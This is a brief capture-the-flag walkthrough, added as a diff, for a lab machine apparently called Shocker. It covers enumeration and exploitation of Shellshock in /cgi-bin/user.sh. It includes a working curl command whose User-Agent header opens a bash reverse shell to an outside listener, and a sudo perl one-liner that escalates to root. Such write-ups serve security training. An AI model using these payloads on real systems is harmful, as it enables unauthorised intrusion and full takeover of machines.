@@ -1,0 +1,24 @@
+1. Run nmap command, no interesting ports found except OS versions
+2. Run gobuster with -f , /cgi-bin/ with 403 forbidden found
+3. /cgi-bin/ usually contain perl and shell scripts, so add " -x pl,sh " to gobuster and we get user.sh
+4. As we know the application is vulnerable to shellshock based on exposed user.sh from cgi-bin
+5. run a curl command and listen to port 
+
+curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.19/4444 0>&1' http://10.10.10.56/cgi-bin/user.sh
+
+6. We get the usershell from NC
+7. the user shell we got belong to shelly, so cd /home/shelly/, we got user.txt there
+8. Priv Esc- we found the machine is vulnerable to sudo (check with LinEnum.sh also)
+9. run "sudo -l" and we get
+
+User shelly may run the following commands on Shocker:
+    (root) NOPASSWD: /usr/bin/perl
+
+10. So we can run a perl command to get the rool using sudo 
+
+sudo perl -e 'exec "/bin/sh"'
+
+11. The above command escalates to root, and check with "id" to verify 
+
+12. sudo cd /root/  and cat root.txt   OR   sudo cat /root/root.txt
+
